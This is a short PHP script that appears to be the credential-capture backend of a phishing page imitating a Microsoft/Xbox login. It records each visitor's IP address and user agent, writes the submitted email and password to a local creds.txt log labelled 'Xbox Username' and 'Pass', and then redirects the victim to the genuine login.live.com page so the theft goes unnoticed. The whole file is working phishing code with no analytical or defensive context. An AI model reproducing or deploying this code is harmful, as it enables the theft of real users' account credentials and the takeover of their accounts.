<?php
	if(isset($_SERVER['HTTP_CLIENT_IP']))
  {
    $ipaddr = $_SERVER['HTTP_CLIENT_IP'];
  }
elseif(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
  {
    $ipaddr = $_SERVER['HTTP_X_FORWARDED_FOR'];
  }
else
  {
    $ipaddr = $_SERVER['REMOTE_ADDR'];
  }

if(strpos($ipaddr,',') !== false)
    {
        $ipaddr = preg_split("/\,/", $ipaddr)[0];
    }

$fp = fopen("../logs/creds.txt", 'a');
fwrite($fp, "\n\nTimestamp: " . date('Y-m-d H:i:s') . "\nIP: " . $ipaddr . "\r\n" . "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n");
fclose($fp);

	session_start();
	$pass = $_POST["passwd"];
	$email=$_SESSION["Email"];
	file_put_contents("../logs/creds.txt", "Xbox Username: " . $email . " Pass: " . $pass . "\n", FILE_APPEND);
	header('Location: https://login.live.com/login.srf');
	exit();
	session_destroy();		
?>
